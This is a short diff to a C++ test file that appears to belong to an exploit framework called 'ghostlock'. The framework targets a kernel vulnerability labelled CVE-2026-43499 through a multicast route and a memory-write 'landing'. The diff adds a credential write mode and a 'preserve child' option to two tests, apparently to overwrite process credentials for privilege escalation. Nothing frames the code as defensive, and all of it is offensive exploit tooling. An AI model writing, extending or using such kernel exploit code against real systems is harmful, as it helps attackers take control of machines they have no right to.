@@ -20,6 +20,7 @@ namespace {
     using ghostlock::backend::cve_2026_43499::KernelAccess43499;
     using ghostlock::backend::cve_2026_43499::Access43499Parameters;
     using ghostlock::backend::cve_2026_43499::TargetState;
+    using ghostlock::backend::cve_2026_43499::memory::WriteMode;
     using ghostlock::backend::cve_2026_43499::route::MulticastLimits;
     using ghostlock::backend::cve_2026_43499::landing::MulticastLanding;
     using ghostlock::backend::cve_2026_43499::landing::MulticastWindow;
@@ -79,6 +80,8 @@ namespace {
         params.route = RouteId::MulticastWaiter;
         params.offset = 0x40U;
         params.offset_set = true;
+        params.write_mode = WriteMode::Credential;
+        params.preserve_child = true;
         expect(access.initialize(params).ok(), "the access comes up through the landing");
         expect(landing.up(), "and the landing brought the route up");
         const std::byte word[8] = {std::byte{0x48}, std::byte{0x47}, std::byte{0x46}, std::byte{0x45},
@@ -106,6 +109,8 @@ namespace {
         Access43499Parameters params;
         params.route = RouteId::MulticastWaiter;
         params.offset_set = true;
+        params.write_mode = WriteMode::Credential;
+        params.preserve_child = true;
         static_cast<void>(access.initialize(params));
         const std::byte word[8] = {};
         const auto refused = access.write(0x2000U, std::span<const std::byte>(word),
